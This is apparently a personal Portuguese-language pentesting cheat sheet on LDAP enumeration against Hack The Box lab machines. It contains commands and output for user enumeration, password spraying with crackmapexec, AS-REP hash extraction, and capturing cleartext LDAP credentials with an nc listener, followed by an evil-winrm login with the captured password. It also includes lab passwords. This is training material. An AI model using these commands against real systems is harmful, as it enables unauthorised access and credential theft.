# LDAP

**Enum**

Users

Este script em python faz enumeração dos utilizadores

`./windapsearch.py -d resolute.megabank.local --dc-ip 10.10.10.169 -U`

![Untitled](LDAP%205cd1610eef3b48dcb125faa5d5042a62/Untitled.png)

Este faz enumeração de utilizadores de forma mais detalhada

`./windapsearch.py -d resolute.megabank.local --dc-ip 10.10.10.169 -U --full |
grep Password`

![Untitled](LDAP%205cd1610eef3b48dcb125faa5d5042a62/Untitled%201.png)

Aqui encontramos uma uma palavra pass

`crackmapexec smb 10.129.96.155 -u hosts.txt -p 'Welcome123!'`

```
└──╼ [★]$ crackmapexec smb 10.129.96.155 -u hosts.txt -p 'Welcome123!' 
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

```bash
ldapsearch -H ldap://10.129.83.134 -x -s base namingcontexts
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.129.83.134
ldapsearch -x -b "dc=htb,dc=local" -D 'ldap@support.htb'-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -H ldap://10.129.57.124
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.129.83.134 '(objectclass=person)' sAMAccountName
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.129.83.134 '(objectclass=person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
ldapsearch -H ldap://10.10.10.10 -p 389 -x -b "dc=htb,dc=local"

rcpclient -U ''
```

[https://github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)

```bash
**Enum Users**
python windapsearch.py -d hb.local --dc-ip 10.10.10.10 -U 
**Enum ObjectClass**
python windapsearch.py -d hb.local --dc-ip 10.10.10.10 --custom "objectClass=*" 
**Get kerberos hash** 
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.138.254 -no-pass
```

- WebLDAP
    
    Obter informações 
    
    ![Untitled](LDAP%205cd1610eef3b48dcb125faa5d5042a62/Untitled%202.png)
    
    Acrescentar um valor no LDAP 
    
    ![Untitled](LDAP%205cd1610eef3b48dcb125faa5d5042a62/Untitled%203.png)
    
    Por um listener e colocar em testar LDAP
    
    ```
    nc -lvnp 389
    listening on [any] 389 ...
    connect to [10.10.14.20] from (UNKNOWN) [10.10.11.222] 56867
    0Y`T;CN=svc_ldap,OU=Service
    Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
    ```
    
    Fazer login
    
    ```
    evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
    Evil-WinRM shell v3.3
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami
    htb\svc_ldap
    ```